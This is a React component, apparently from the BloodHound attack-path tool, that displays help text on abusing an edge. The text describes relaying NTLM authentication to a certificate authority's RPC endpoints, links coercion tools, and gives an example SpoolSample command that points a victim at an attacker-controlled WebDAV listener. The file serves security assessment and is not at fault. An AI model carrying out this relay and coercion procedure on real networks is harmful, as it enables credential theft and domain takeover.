// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps> = () => {
    return (
        <>
            <Typography variant='body2'>
                1. Start the Relay Server The NTLM relay can be executed with tools like Inveigh or ntlmrelayx.py,
                targeting the RPC endpoints of the enterprise CA server.
            </Typography>
            <Typography variant='body2'>
                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
                <Link
                    target='_blank'
                    rel='noopener'
                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                    Windows Coerced Authentication Methods
                </Link>
                . Examples of tools include:
                <ul>
                    <li>
                        <Link target='_blank' rel='noopener' href='https://github.com/leechristensen/SpoolSample'>
                            SpoolSample
                        </Link>
                    </li>
                    <li>
                        <Link target='_blank' rel='noopener' href='https://github.com/topotam/PetitPotam'>
                            PetitPotam
                        </Link>
                    </li>
                </ul>
            </Typography>
            <Typography variant='body2'>
                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
            </Typography>
            <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
            <Typography variant='body2'>
                3. Relay to RPC Endpoints The relayed authentication is directed to the RPC endpoints of the vulnerable
                enterprise CA server. This requires that RPC encryption is not enforced on the target CA.
            </Typography>
            <Typography variant='body2'>
                4. Authenticate using the certificate obtained as the target principal, for example by using{' '}
                <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
                    Rubeus
                </Link>
                .
            </Typography>
        </>
    );
};

export default WindowsAbuse;
